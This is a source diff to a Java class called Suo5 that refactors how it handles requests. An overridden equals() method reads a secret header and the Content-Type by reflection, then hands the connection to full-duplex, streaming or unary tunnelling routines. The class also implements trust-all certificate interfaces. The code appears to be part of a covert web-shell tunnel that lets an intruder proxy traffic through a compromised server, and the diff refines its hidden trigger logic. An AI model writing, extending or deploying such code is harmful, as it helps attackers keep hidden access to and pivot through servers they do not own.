@@ -31,7 +31,6 @@ public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
         this.gOutStream = out;
     }
 
-
     @Override
     public boolean equals(Object obj) {
         Object[] args = ((Object[]) obj);
@@ -40,25 +39,21 @@ public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
         try {
             String value = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, headerName);
             String contentType = (String) request.getClass().getMethod("getHeader", String.class).invoke(request, "Content-Type");
-            if (value == null || !value.contains(headerValue)) {
-                return false;
-            }
-            if (contentType == null) {
-                return false;
-            }
-            if (contentType.equals("application/plain")) {
-                tryFullDuplex(request, response);
+            if (value != null && value.contains(headerValue) && contentType != null) {
+                if (contentType.equals("application/plain")) {
+                    tryFullDuplex(request, response);
+                    return true;
+                }
+                if (contentType.equals("application/octet-stream")) {
+                    processDataBio(request, response);
+                } else {
+                    processDataUnary(request, response);
+                }
                 return true;
-            }
-
-            if (contentType.equals("application/octet-stream")) {
-                processDataBio(request, response);
-            } else {
-                processDataUnary(request, response);
             }
         } catch (Throwable ignored) {
         }
-        return true;
+        return false;
     }
 
     public void readFull(InputStream is, byte[] b) throws IOException, InterruptedException {
@@ -281,7 +276,7 @@ public class Suo5 implements Runnable, HostnameVerifier, X509TrustManager {
             try {
                 sc.close();
                 respOutStream.close();
-            }catch (Exception ignored) {
+            } catch (Exception ignored) {
 
             }
             if (t != null) {
